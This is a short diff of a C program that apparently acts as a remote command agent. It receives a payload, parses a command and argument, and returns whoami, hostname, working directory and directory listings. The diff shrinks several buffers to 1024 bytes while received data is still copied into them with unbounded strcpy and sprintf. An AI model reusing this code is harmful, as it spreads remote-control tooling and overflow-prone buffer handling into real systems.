@@ -51,7 +51,7 @@ int main() {
         printf("Receiving:\n\n%s\n\n", receive);
 
         //copying original payload
-        char receive_copy[2048];
+        char receive_copy[1024];
         strcpy(receive_copy, receive);
   
         //parsing to extract payload
@@ -61,7 +61,7 @@ int main() {
         char *command = strtok(command_start, "'");
 
         //copying original payload
-        char receive_copy2[2048];
+        char receive_copy2[1024];
         strcpy(receive_copy2, receive);
 
         //parsing to extract argument
@@ -115,15 +115,15 @@ char *whoamiCommand() {
 
 //hostname syscall
 char *hostnameCommand() {
-    static char hostname[2048];
-    gethostname(hostname, 2048);
+    static char hostname[1024];
+    gethostname(hostname, 1024);
     return hostname;
 }
 
 //pwd syscall
 char *pwdCommand() {
-    static char directory[2048];
-    getcwd(directory, 2048);
+    static char directory[1024];
+    getcwd(directory, 1024);
     return directory;
 }
 
@@ -133,7 +133,7 @@ char *lsCommand(char *path) {
     static char error_message[1024];
     if (path == NULL)
         path = ".";
-    char *buf = malloc(2048 * sizeof(char));
+    char *buf = malloc(1024 * sizeof(char));
     DIR *dirp = opendir(path);
     if (dirp == NULL) {
         strerror_r(errno, error_message, sizeof(error_message));
@@ -144,8 +144,8 @@ char *lsCommand(char *path) {
     sprintf(buf, "Type\t\tSize\tName\n");
     sprintf(buf + strlen(buf), "====\t\t====\t====\n");
     while ((list = readdir(dirp)) != NULL) {
-        char type[2048];
-        char pathname[2048];
+        char type[1024];
+        char pathname[1024];
         sprintf(pathname, "%s/%s", path, list->d_name);
         lstat(pathname, &sb);
         switch (sb.st_mode & S_IFMT) {
